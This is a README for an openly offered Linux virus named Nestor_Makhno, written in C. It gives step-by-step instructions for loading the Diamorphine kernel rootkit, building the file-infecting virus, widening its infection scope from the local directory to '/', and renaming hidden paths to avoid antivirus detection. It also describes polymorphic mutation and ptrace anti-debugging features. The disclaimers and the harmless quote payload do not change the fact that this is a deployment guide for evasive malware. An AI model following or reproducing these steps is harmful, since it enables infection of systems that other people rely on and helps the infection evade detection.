# Nestor_Makhno
Linux virus in C that uses mutation and rootkit functionality

Nestor Makhno is a simple Linux virus that uses a rootkit(Diamorphine) to help hide its tracks and avoid av detection. The historical Nestor Makhno was famous for a lot, but one thing was being the first to begin using machine guns on covered wagons. He didn't create machine guns or wagons, but he knew these things would work well together. His ideas are still credited as the first proto-tank and first drive-by shooting. The Diamorphine rootkit existed long before the virus code added here. Its mostly used to make the process invisible in the pids.c file. As-is, it will also be used to create a hidden directory in /dev/shm/diamorphine_secret_def_not_a_virus. To avoid detection we suggest renaming this directory in the code of simmple.c

$ grep mkdir virus/simple.c
   mkdir("/dev/shm/diamorphine_secret_def_not_a_virus",0775);

Diamorphine will hide any folder on the system who's name begins with "diamorphine_secret". So be sure to include this with any locations that should be hidden. You may also want to build and run the virus portion of Nestor_Makhno from a folder like this to avoid dectection as well. 

To use this code, first go to the Diamorphine directory, build and install it:

$ cd ./Diamorphine
$ make
$ sudo insmod ./diamorphine.ko

If you expirence errors, you most likely do not have kernel headers installed. On Debian you may install them with the following:

$ sudo apt search linux-headers-$(uname -r)

Then go to the directory for the virus and build it:

$ cd ../virus
$ make

To prevent abuse, there is no real payload used with this code. Instead only an infamous quote by the historical Nestor Makhno will be injected into binaries. After completing you will find a binary called 'Nester_Makhno' and another called 'hello' to be used for testing. The code is set here to only infect files in the same directory:

$ grep '^   scan' virus/simple.c
   scan_dir(".", virus);

The above location may be editted to '/' or any desired location if you have a vm or sandbox. It should go without sayinig, but DONOT RELEASE THIS CODE INTO THE WILD. THIS IS FOR TESTING AND EDUCATIONAL PURPOSES ONLY. I am not responsible for any damage this may cause and deepending on your location, running this code may be illegal on devices you do not own. So you have been warned. 

Running the code you will see the quote from our payload: 

$ cd ./virus
$ ./Nestor_Makhno
Death to all those who stand in the way of freedom for the working people!
 
You can silence this by outputting to /dev/null. After this, you will find the hello binary will also excute this quote:

$ ./hello        
Death to all those who stand in the way of freedom for the working people!
Hello!

This is despite this string not being found in the code of hello.c:

$ cat ./hello.c 
#include <stdio.h>

int main(){
	printf("Hello!\n");
}

Using virus strategies of the past, the modify.c file in the virus directory is used to randomly obscure this code's signature in memory. Basically making this a mutation virus as well. PTRACE has been used in trace.c to help prevent debugging. Combined with the rootkit functionality, this will make detection much more difficult, but not impossible.

Information on the historical Nestor Makhno may be found here:

https://en.wikipedia.org/wiki/Nestor_Makhno

Information on the Diamorphine may be found here:

https://github.com/bms8197/diamorphine 
